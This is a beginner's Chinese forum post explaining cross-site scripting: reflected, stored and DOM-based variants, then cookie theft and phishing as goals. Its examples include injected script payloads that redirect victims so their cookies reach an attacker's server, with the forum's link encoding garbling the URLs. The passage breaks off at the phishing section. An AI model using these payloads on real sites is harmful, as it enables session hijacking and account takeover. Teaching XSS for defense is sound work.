
# [原创]XSS跨站总结

XSS跨站

默小西

菜鸟总结，大牛请绕道![](https://bbs.kanxue.com/view/img/face/1.gif)![](https://bbs.kanxue.com/view/img/face/1.gif)

## 简介

跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

## 原因

有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，XSS攻击就完成了。

## 种类

### 1. 反射型XSS

反射型XSS，又称非持久型XSS。(一般需要自行去触发，输入—输出)

**反射：**这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。

**非持久性：**这种攻击方式往往具有一次性。

**方式：**

攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。

**Eg：**

攻击者将如下链接发送给受害者：

```
d80K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6g2S2j5h3q4S2Q4x3X3g2U0L8$3#2Q4x3V1k6K6k6h3q4J5j5$3S2Q4x3X3g2S2M7%4m8Q4x3@1k6A6L8Y4m8#2N6q4)9K6c8q4)9J5y4X3I4@1i4K6y4n7M7$3y4J5K9i4m8@1i4K6t1$3k6%4c8Q4x3@1u0S2L8r3g2J5N6q4)9J5z5r3c8G2j5%4g2E0k6h3&6@1i4K6u0W2j5$3!0G2K9$3W2W2i4K6t1&6i4K6y4n7i4K6t1$3L8s2c8Q4x3@1u0Q4x3V1k6K6j5%4u0A6M7s2c8Q4x3U0k6Y4N6q4)9K6b7R3`.`.
```

当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的`search.asp`页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型XSS的原因。

### 2. 存储型XSS

存储型XSS，又称持久型XSS。(一般无意触发，输入--进入数据库\*--取出数据库--输出)

**持久性：**攻击脚本将被永久地存放在目标服务器的数据库和文件中。

**方式：**

这种攻击多见于论坛或博客，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。

**Eg：**

恶意攻击者可以通过发一篇包含了恶意代码的帖子。

（帖子中包含了恶意代码，`<script>window.open(“adcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0Q4x3X3g2U0L8$3#2Q4x3@1k6H3j5i4u0S2L8g2)9K6c8q4)9J5b7X3c8G2j5%4g2E0k6h3&6@1i4K6u0W2j5$3!0G2K9$3W2W2i4K6t1&6i4K6t1$3L8s2c8Q4x3@1u0Q4x3V1k6K6j5%4u0A6M7s2c8Q4x3U0k6Y4N6q4)9K6b7W2!0q4c8W2!0n7b7#2)9^5z5b7`.`.

这时甲和乙看到了恶意攻击者的提子，当在查看帖子时就都中招了，他们的cookie信息都发送到了恶意攻击者的服务器上，攻击成功！

可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。

### 3. DOM-XSS

DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，它涉及的两个层次不是服务器端和浏览器端，而是浏览器端的JavaScript层和HTML层。更准确的说，就是服务器脚本变成了客户端脚本。

**方式：**

用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript。服务器的响应中并不以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，上述脚本得以处理。

**Eg：**

[3b2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6i4y4A6N6r3g2Q4x3V1k6%4k6h3I4U0L8$3#2W2i4K6u0W2K9s2c8E0L8q4)9K6c8X3&6S2L8h3g2Q4x3@1c8\*7K9r3q4F1k6%4y4S2L8R3`.`](<https://bbs.kanxue.com/elink@478K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6i4y4A6N6r3g2Q4x3V1k6%4k6h3I4U0L8$3#2W2i4K6u0W2K9s2c8E0L8q4)9K6c8X3&6S2L8h3g2Q4x3@1c8*7K9r3q4F1k6%4y4S2L8R3`.`.)

使用以下的脚本打印出登录用户zhangsan的名字，即

```
<SCRIPT>

var pos=docmnent.URL.indexOf(“name=”)+5;

document.write (document.URL.substring(pos,document.URL.length));

</SCRIPT>
```

如果这个脚本用于请求[911K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6i4y4A6N6r3g2Q4x3V1k6%4k6h3I4U0L8$3#2W2i4K6u0W2K9s2c8E0L8q4)9K6c8X3&6S2L8h3g2Q4x3@1c8Q4x3U0k6D9N6q4)9K6b7Y4y4U0M7X3W2H3N6q4)9J5y4X3N6@1i4K6y4n7j5h3I4W2M7Y4c8Q4x3U0S2Q4c8e0u0Q4z5o6m8Q4z5f1y4j5f1#2y4Q4c8e0u0Q4z5o6m8Q4z5f1c8Q4x3U0W2Q4x3U0k6D9N6q4)9K6b7W2)9J5c8Y4y4U0M7X3W2H3N6q4)9J5y4X3N6@1i4K6y4n7i4@1f1$3i4K6V1%4i4@1t1$3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1#2i4@1t1H3i4@1t1I4i4@1f1#2i4@1q4r3i4@1u0o6i4@1f1^5i4K6R3%4i4@1t1@1h3q4y4e0i4@1f1$3i4K6V1@1i4@1u0n7i4@1f1#2i4K6R3%4i4@1u0n7i4@1f1%4i4K6W2m8i4K6R3@1i4@1f1#2i4K6S2r3i4K6V1I4i4@1f1%4i4K6V1@1i4K6W2r3i4@1f1K6i4K6R3H3i4K6R3J5](<https://bbs.kanxue.com/elink@911K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4S2^5P5q4)9J5k6i4y4A6N6r3g2Q4x3V1k6%4k6h3I4U0L8$3#2W2i4K6u0W2K9s2c8E0L8q4)9K6c8X3&6S2L8h3g2Q4x3@1c8Q4x3U0k6D9N6q4)9K6b7Y4y4U0M7X3W2H3N6q4)9J5y4X3N6@1i4K6y4n7j5h3I4W2M7Y4c8Q4x3U0S2Q4c8e0u0Q4z5o6m8Q4z5f1y4j5f1#2y4Q4c8e0u0Q4z5o6m8Q4z5f1c8Q4x3U0W2Q4x3U0k6D9N6q4)9K6b7W2)9J5c8Y4y4U0M7X3W2H3N6q4)9J5y4X3N6@1i4K6y4n7i4@1f1$3i4K6V1%4i4@1t1$3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1#2i4@1t1H3i4@1t1I4i4@1f1#2i4@1q4r3i4@1u0o6i4@1f1^5i4K6R3%4i4@1t1@1h3q4y4e0i4@1f1$3i4K6V1@1i4@1u0n7i4@1f1#2i4K6R3%4i4@1u0n7i4@1f1%4i4K6W2m8i4K6R3@1i4@1f1#2i4K6S2r3i4K6V1I4i4@1f1%4i4K6V1@1i4K6W2r3i4@1f1K6i4K6R3H3i4K6R3J5>)

当用户点击这个链接，服务器返回包含上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的`document`对象`URL`属性的值就是当前页而的URL。在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得`<script>alert(“XSS”)</script>`成为页面最终显示的HTML文本，从而导致DOM—base XSS攻击发生。

## 常用的攻击手段和目的

### 1. 窃取Cookie

盗用 cookie （主要），获取敏感信息，比如盗取各类用户账号、控制企业数据、盗窃企业重要的具有商业价值的资料、非法转账等等。

**代码：**

```
<script>location.href = '344K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6g2W2G2N6i4u0K6K9i4c8W2i4K6u0W2j5$3!0E0i4K6u0r3f1%4c8W2j5h3I4W2M7W2)9J5k6i4m8Z5M7q4)9K6c8X3y4G2L8$3E0A6k6g2)9K6c8q4)9J5y4#2)9J5b7X3c8G2j5%4g2E0k6h3&6@1i4K6u0W2j5$3!0G2K9$3W2W2i4K6y4n7i4K6t1$3L8s2c8Q4x3@1u0Q4x3V1k6K6j5%4u0A6M7s2c8Q4x3U0k6Y4N6q4)9K6b7R3`.`.
```

其中`location.href`是指页面跳转到

```
972K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6g2k6#2L8r3&6W2M7X3q4T1L8r3g2e0K9i4c8W2i4K6u0W2j5$3!0E0i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2H3K9s2m8Q4x3@1k6K6k6h3q4J5j5$3S2Q4x3@1c8Q4x3U0k6D9N6q4)9K6b7Y4y4U0M7X3W2H3N6q4)9J5y4X3N6@1i4K6y4n7L8r3!0U0j5i4c8A6L8$3&6Q4x3X3g2Z5M7X3g2X3i4K6t1$3L8X3u0K6M7q4)9K6b7W2)9K6c8q4)9J5y4X3&6T1M7%4m8Q4x3@1u0Q4x3U0N6Z5N6s2c8H3i4K6y4m8i4K6u0r3i4K6u0r3N6%4N6%4i4K6u0W2h3h3!0#2M7Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6e0N6r3g2S2L8r3g2J5i4K6u0W2M7r3S2H3i4K6y4r3j5$3!0G2K9$3W2W2i4K6y4p5i4K6t1%4i4K6u0n7k6r3!0U0N6h3#2W2L8Y4c8Q4x3X3g2U0L8$3!0C8K9h3g2Q4x3@1u0Q4x3U0k6D9N6q4)9K6b7W2)9J5c8Y4y4U0M7X3W2H3N6q4)9J5y4X3N6@1i4K6y4n7
```

或者

```
"><a href="#" onclick="document.location='1b2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4W2G2N6i4u0K6K9i4c8W2i4K6u0W2j5$3!0E0i4K6u0r3N6$3S2S2N6r3g2$3k6i4u0&6L8%4g2%4j5h3&6@1i4K6u0W2M7r3S2H3i4K6y4r3j5$3!0G2K9$3W2W2i4K6y4p5i4K6t1%4i4K6t1$3L8X3u0K6M7q4)9K6b7W2)9J5b7X3g2K6j5$3q4H3k6g2)9J5z5r3c8G2j5%4g2E0k6h3&6@1i4K6u0W2j5$3!0G2K9$3W2W2i4K6t1&6i4K6y4n7"><Click Me></a></script>
```

`document.location`和`location.href`基本一样

通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码：

```
<script>location.replace(“40eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4@1N6r3q4U0K9%4m8S2k6$3g2Q4x3X3g2U0L8$3#2Q4x3V1k6J5k6h3y4G2M7X3c8Q4x3X3g2S2M7%4m8Q4x3@1k6K6k6h3y4J5k6i4c8Q4x3@1c8Q4c8e0u0Q4z5o6m8Q4z5f1y4Q4x3V1u0V1L8$3y4#2L8h3g2F1N6q4)9J5k6h3y4G2L8$3E0A6k6g2)9J5z5g2)9J5y4X3I4@1i4K6y4n7i4K6u0r3M7$3y4J5K9i4m8@1i4K6t1$3k6%4c8Q4x3@1t1`.
```

当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站[033N6%4N6%4i4K6u0W2j5i4c8@1j5h3y4C8M7r3q4Y4k6g2)9J5k6h3y4G2L8b7`.`.，打开其中的`recourd.asp`，将受害者浏览器的Cookie信息给记录下来。这样，攻击者就得到了用户的Cookie信息。](<https://bbs.kanxue.com/elink@c95K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4@1N6r3q4U0K9%4m8S2k6$3g2Q4x3X3g2U0L8$3#2Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0k6Q4z5o6W2Q4z5e0y4Q4c8e0g2Q4b7V1y4Q4z5o6m8Q4c8e0g2Q4z5o6g2Q4b7U0k6Q4c8e0c8Q4b7U0S2Q4b7f1c8Q4c8e0N6Q4z5f1q4Q4z5o6c8J5k6h3y4G2N6i4u0V1i4K6u0W2j5i4y4H3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1#2i4@1t1H3i4K6R3$3i4@1f1#2i4K6S2r3i4K6V1%4i4@1f1#2i4@1q4q4i4@1t1K6i4@1f1^5i4K6R3H3i4K6R3#2i4@1f1$3i4@1t1#2i4K6S2r3i4@1f1^5i4@1p5%4i4K6R3^5i4@1f1#2i4K6V1&6i4@1p5^5i4@1f1%4i4K6W2m8i4K6R3@1b7$3!0G2K9$3W2W2i4@1f1@1i4@1u0r3i4@1p5I4i4@1f1$3i4K6R3I4i4@1q4r3i4@1f1%4i4@1u0n7i4K6V1&6i4@1f1^5i4@1q4q4i4@1t1H3i4@1f1#2i4@1u0p5i4K6V1#2i4@1f1@1i4@1t1^5i4K6S2n7i4@1f1$3i4K6W2p5i4@1p5#2i4@1f1K6i4K6R3H3i4K6R3J5i4@1f1^5i4@1u0r3i4K6V1&6i4@1f1$3i4@1p5H3i4@1t1%4i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1$3i4K6V1@1i4@1u0n7i4@1f1#2i4K6R3%4i4@1u0n7i4@1f1^5i4K6R3H3i4K6R3#2i4@1f1#2i4@1t1H3i4@1t1I4i4@1f1#2i4@1u0q4i4K6V1%4i4@1f1#2i4K6R3^5i4@1t1H3i4@1f1@1i4@1u0m8i4K6R3$3i4@1f1%4i4K6V1@1i4@1p5^5i4@1f1$3i4K6R3^5i4@1t1%4i4@1f1%4i4K6W2m8i4K6R3@1b7$3!0G2K9$3W2W2i4@1f1@1i4@1u0r3i4@1p5I4i4@1f1$3i4K6R3I4i4@1q4r3i4@1f1K6i4K6R3H3i4K6R3J5>)

得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。这样，攻击者可以任意地利用受害者的身份访问服务器上的资源和服务，甚至对受害者和服务器上的数据进行破坏。如果受害者拥有管理员权限，攻击者还可以利用其提升自己账号的权限，从而进行进一步的攻击。

注：Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）

`document.location.href`和`document.location.replace`都可以实现从A页面切换到B页面，但他们的区别是：

用`document.location.href`切换后，可以退回到原页面。而用`document.location.replace`切换后，不可以通过“后退”退回到原页面。

关于`document.location.href`或其他可回退的切换方式

`document.location` 相当于 `document.URL` 声明了装载文档的URL,

除非发生了服务器重定向, 否则该属性的值与`Window.location.href`的值是一样的.

### 2. 钓鱼

所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码：
